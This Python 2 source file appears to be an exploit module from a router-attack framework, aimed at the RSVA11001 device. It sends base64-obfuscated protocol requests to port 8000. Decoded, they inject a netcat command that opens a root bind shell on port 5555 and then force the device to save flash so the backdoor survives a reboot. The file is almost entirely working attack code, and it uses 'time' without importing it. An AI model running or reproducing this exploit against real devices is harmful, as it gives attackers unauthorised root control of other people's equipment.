import socket
import util
from ..router_vuln import RouterVuln

class rsva_backdoor(RouterVuln):
	"""Execute a remote netcat shell through command injection
	   http://www.exploit-db.com/exploits/24892
	"""
	def __init__(self):
		self.router = 'RSVA11001'
		self.vuln   = 'Backdoor Root'
		self.inject = "UkVNT1RFIEhJX1NSREtfVElNRV9TZXRUaW1lU2V0QXR0ciBNQ1RQLzEuMA0KQ"\
					"1NlcTo2Ng0KQWNjZXB0OnRleHQvSERQDQpDb250ZW50LVR5cGU6dGV4dC9IRFAN"\
					"CkZ1bmMtVmVyc2lvbjoweDEwDQpDb250ZW50LUxlbmd0aDoxMjQNCg0KU2VnbWV"\
					"udC1OdW06MQ0KU2VnbWVudC1TZXE6MQ0KRGF0YS1MZW5ndGg6NzYNCg0KAQAGAW"\
					"E7L3Vzci9iaW4vbmMgLWwgLXAgNTU1NSAtZSAvYmluL3NoAA4jAQBAAAAAAAAAA"\
					"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="
		self.hard_save = "UkVNT1RFIEhJX1NSREtfREVWX1NhdmVGbGFzaCBNQ1RQLzEuMA0KQ1NlcT"\
						 "o0MQ0KQWNjZXB0OnRleHQvSERQDQpDb250ZW50LVR5cGU6dGV4dC9IRFAN"\
						 "CkZ1bmMtVmVyc2lvbjoweDEwDQpDb250ZW50LUxlbmd0aDoxNQ0KDQpTZW"\
						 "dtZW50LU51bTowDQo="
		super(rsva_backdoor,self).__init__()

	def run(self):
		try:
			util.Msg('Executing command injection on %s...'%self.ip)
			sock = socket.socket()
			sock.connect((self.ip, 8000))
			sock.sendall(self.inject)
			time.sleep(3)
			util.Msg('Forcing the device to save...')
			sock.sendall(self.hard_save)
			sock.close()
			util.Msg('Reboot router for root shell on %s:5555'%(self.ip))
		except Exception, e:
			util.Error('Error: %s'%e)
